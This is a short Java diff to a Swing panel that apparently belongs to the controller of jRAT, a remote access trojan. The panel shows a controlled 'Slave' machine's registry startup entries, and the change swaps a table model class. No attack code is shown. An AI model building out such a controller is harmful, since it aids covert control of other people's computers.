@@ -13,10 +13,10 @@ import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet78RegistryStartup;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 
 
@@ -24,11 +24,11 @@ import se.jrat.controller.ui.components.DefaultJTable;
 public class PanelControlRegStart extends PanelControlParent {
 
 	private JTable table;
-	private DefaultTableModel model;
+	private TableModel model;
 
 	public static final ImageIcon ICON = IconUtils.getIcon("registry-string");
 
-	public DefaultTableModel getModel() {
+	public TableModel getModel() {
 		return model;
 	}
 
@@ -92,7 +92,7 @@ public class PanelControlRegStart extends PanelControlParent {
 
 		table.setRowHeight(25);
 
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { " ", "Name", "Type", "Path" }));
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { " ", "Name", "Type", "Path" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(25);
 		table.getColumnModel().getColumn(1).setPreferredWidth(140);
 		table.getColumnModel().getColumn(2).setPreferredWidth(99);
